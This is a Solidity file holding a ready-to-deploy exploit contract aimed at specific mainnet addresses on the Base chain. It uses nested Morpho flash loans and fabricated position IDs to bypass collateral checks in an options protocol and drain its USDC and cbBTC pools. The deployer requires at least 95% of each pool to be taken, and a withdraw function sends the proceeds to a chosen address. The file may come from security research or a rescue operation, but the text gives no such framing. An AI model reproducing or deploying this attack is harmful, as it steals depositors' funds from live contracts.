// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "./Interfaces.sol";
import {TokenId} from "@types/TokenId.sol";

contract USDC_cbBTC30bpsBaseAttacker_Deployer {
    USDC_cbBTC30bpsBaseAttacker public attacker;
    IERC20Partial token0 = IERC20Partial(address(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913)); // usdc
    IERC20Partial token1 = IERC20Partial(address(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf)); // cbbtc
    ICollateralTracker_v4 tracker0 = ICollateralTracker_v4(address(0x02E142e535efc136eDE67D6DD39BD26BC945393B));
    ICollateralTracker_v4 tracker1 = ICollateralTracker_v4(address(0xB324A82b9AaAe1318CFeac1bdf0957BBd6f6C3E3));
    constructor(address _withdrawer) {
        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        attacker = new USDC_cbBTC30bpsBaseAttacker(_withdrawer);
        attacker.takeFlashLoanAndAttack();
        uint256 attackerBalance0 = token0.balanceOf(address(attacker));
        uint256 attackerBalance1 = token1.balanceOf(address(attacker));
        require(attackerBalance0 >= (poolAssets0Before * 95) / 100);
        require(attackerBalance1 >= (poolAssets1Before * 95) / 100);
    }
}

contract USDC_cbBTC30bpsBaseAttacker is IMorphoFlashLoanCallback {
    uint256[] fake_token_uints = [16939609024273842, 17158553267796065, 17083582814389265, 17086352299123725, 16980362901391387, 17003795739444277, 17101378560687335, 17026674622507335, 17154261232855203, 17030439208130036, 16945967490755149, 17082751614160489, 17097157113273900, 16905884702516433, 17066504289794370, 17119504401467382, 17034803466092545, 16985606900097701, 16942964596981210, 17025612530710537, 16904132411153761, 16949521359855531, 16920216715452750, 16911017735677536, 16914178675719633, 17074540876198711, 17119329401324348, 17036991767596593, 17122846506677707, 16999873957325411, 17031339119151811, 17097995700960721, 17142266941213954, 16900417526689188, 17130624793684447, 16910690735799991, 17073996118339521, 16989089162921432, 17060011233606751, 17003020264083211, 17093568332869701, 16969179392893693, 17103589480369901, 17008221870292762, 16918871661380487, 16897464278369093, 16927713925256617, 16934049758747081, 16894635486029112, 16923138720850302, 17114373863952007, 16963022048440415, 17092584053216203, 16992964215424125, 16942409542027123, 17140497124282292, 16969369082248421, 16905463410247128, 17052541747857150, 17038292193577029, 16975851747102136, 17138198303696334, 16908147932247101, 17139615699826370, 16938993875545352, 17075863080850773, 16971120488436790, 16988465729292003, 17014445553286162, 16974767401004252, 17119602343874712, 16895531852075711, 17099849001593597, 16929239666017003, 17020691157262149, 16897926812058864, 17154365982004348, 16992035341009344, 17044600072961146, 17032253897074887, 16972156248137231, 16962955384487272, 17016931853357540, 17083148281277439, 17115324528783460, 17072588196537057, 17142593927072576, 17032205826932525, 17088317117953075, 16935870331365850, 17128654064464828, 17021660217262511, 17029938928325889, 17022423542452956, 17151127052636987, 17094514593261230, 17035185689438149, 16888769806416760, 17106588479166820, 17123055963217059, 16996711919775464, 16968761966455866, 17029873506273690, 16968539133849167, 16913491436315882, 16944179477276374, 16919590554483084, 16993502753544935, 17167047696388934, 17157376839885919, 16953408099015714, 17061718554541272, 17161081997515482, 16936365070053071, 17025796118226330, 17154610629572122, 17022685737634914, 17057008683916553, 17087643854683771, 16921290824134246, 16932248563778116, 17030010218713865, 16970073014124536, 3437866335631248550078689307201264, 3437866335631248550078689307201264];

    // On base
    IERC20Partial token0 = IERC20Partial(address(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913)); // usdc
    IERC20Partial token1 = IERC20Partial(address(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf)); // cbbtc
    IMorpho morpho = IMorpho(address(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb));

    ICollateralTracker_v4 tracker0 = ICollateralTracker_v4(address(0x02E142e535efc136eDE67D6DD39BD26BC945393B));
    ICollateralTracker_v4 tracker1 = ICollateralTracker_v4(address(0xB324A82b9AaAe1318CFeac1bdf0957BBd6f6C3E3));
    IPanopticPool_v4 pp = IPanopticPool_v4(address(0x128f822727193887ffc4186B556F2D68e60dC330));

    int24 constant MIN_V3POOL_TICK = -887272;
    int24 constant MAX_V3POOL_TICK = 887272;

    address private immutable withdrawer;

    bool private executed = false;

    constructor(address _withdrawer) {
        withdrawer = _withdrawer;
    }

    modifier onlyWithdrawer() {
        require(msg.sender == withdrawer, "Only constructor-supplied withdrawer can call this function");
        _;
    }

    function takeFlashLoanAndAttack() public {
        require(!executed);
        // take flash loan
        (uint256 poolAssets0, , ) = tracker0.getPoolData();
        (uint256 poolAssets1, , ) = tracker1.getPoolData();
        {
            // Initiate first flash loan for token0
            uint256 borrowAmount0 = 2 * poolAssets0;
            // Encode the token1 borrow amount for the nested loan
            bytes memory data = abi.encode(borrowAmount0, 2 * poolAssets1, true);
            morpho.flashLoan(address(token0), borrowAmount0, data);
        }
        executed = true;
    }

    uint256 private token0Amount; // Store for nested callback
    function onMorphoFlashLoan(
        uint256 amount,
        bytes calldata data
    ) external override {
        require(!executed);

        (uint256 amount0, uint256 amount1, bool isFirstLoan) =
                    abi.decode(data, (uint256, uint256, bool));

        if (isFirstLoan) {
            // Store token0 amount for later
            token0Amount = amount0;

            // Initiate nested flash loan for token1
            bytes memory nestedData = abi.encode(amount0, amount1, false);
            morpho.flashLoan(address(token1), amount1, nestedData);

            // After the nested callback completes, approve token0 repayment
            token0.approve(address(morpho), amount0);
        } else {
            // This is the nested (token1) flash loan callback
            // We now have both tokens - execute the attack
            drainPool();

            // Approve token1 repayment for the nested loan
            token1.approve(address(morpho), amount1);
        }
    }

    function drainPool() internal {
        // - deposit funds
        (uint256 attackAmount0, , ) = tracker0.getPoolData();
        (uint256 attackAmount1, , ) = tracker1.getPoolData();
        token0.approve(address(tracker0), type(uint104).max);
        token1.approve(address(tracker1), type(uint104).max);

        tracker0.deposit(uint128(token0.balanceOf(address(this))), address(this));
        tracker1.deposit(uint128(token1.balanceOf(address(this))), address(this));

        // - mint ITM options
        TokenId[] memory posIdList = new TokenId[](1);
        posIdList[0] = TokenId.wrap(3778244379283224768956318779125);
        TokenId[] memory posIdList2 = new TokenId[](2);
        posIdList2[0] = TokenId.wrap(3778244379283224768956318779125);
        posIdList2[1] = TokenId.wrap(2560008631394923044788730496757);

        // --- for Asset 0
        pp.mintOptions(
            posIdList, // positionIdList
            uint128(attackAmount0), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK, // tickLimitHigh
            false
        );

        // --- for Asset 1
        pp.mintOptions(
            posIdList2, // positionIdList
            uint128(attackAmount1), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK, // tickLimitHigh
            false
        );

        // ---------------------------------------------------------------------
        // - withdraw funds with fake position list

        // Create a list of positions that don't exist
        TokenId[] memory fakeTokenIdList = generateTokenIdListFromFakeTokenUints();

        // Now use the list of positions that don't exist

        // 1. calculate how much I can withdraw
        uint256 intermediateBalance0 = tracker0.balanceOf(address(this));
        uint256 toWithdraw0 = tracker0.convertToAssets(intermediateBalance0);
        // 2. withdraw with fake list
        tracker0.withdraw(toWithdraw0, address(this), address(this), fakeTokenIdList, false);

        // repeat for token1
        uint256 intermediateBalance1 = tracker1.balanceOf(address(this));
        uint256 toWithdraw1 = tracker1.convertToAssets(intermediateBalance1);
        tracker1.withdraw(toWithdraw1, address(this), address(this), fakeTokenIdList, false);

        // now liquidate my own position and repeat...
        // NOTE: Now that we execute the attack with a single drainPool, no need to do this - just
        // leave the uncollateralised positions open
        /* TokenId[] memory emptyTokenList = new TokenId[](0);
        pp.liquidate(emptyTokenList, address(this), posIdList2); */
    }

    function generateTokenIdListFromFakeTokenUints() internal view returns (TokenId[] memory fakeTokenIdList) {
        fakeTokenIdList = new TokenId[](fake_token_uints.length);
        for (uint16 i = 0; i < fake_token_uints.length;) {
            fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
            unchecked {
              ++i;
            }
        }
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function withdraw(address tokenAddress, uint256 amount) external onlyWithdrawer {
        if (tokenAddress == address(0)) {
            // Withdraw ETH
            require(address(this).balance >= amount, "Insufficient ETH balance");
            (bool success, ) = payable(withdrawer).call{value: amount}("");
            require(success, "ETH transfer failed");
        } else {
            // Withdraw ERC20 token
            IERC20Partial token = IERC20Partial(tokenAddress);
            require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
            token.transfer(withdrawer, amount); // revert if token transfer fails
        }
    }
}
